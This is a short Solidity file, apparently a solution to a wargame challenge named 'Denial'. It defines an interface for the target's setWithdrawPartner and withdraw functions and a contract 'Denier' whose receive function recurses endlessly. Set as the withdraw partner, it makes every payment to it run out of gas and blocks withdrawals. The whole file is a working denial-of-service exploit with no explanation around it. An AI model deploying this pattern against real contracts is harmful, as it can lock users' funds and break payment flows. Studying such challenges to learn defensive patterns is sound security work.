// SPDX_LICENSE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}
contract Denier {
    function recurse() public {
        recurse();
    }
    receive() external payable {
        recurse();
    }
}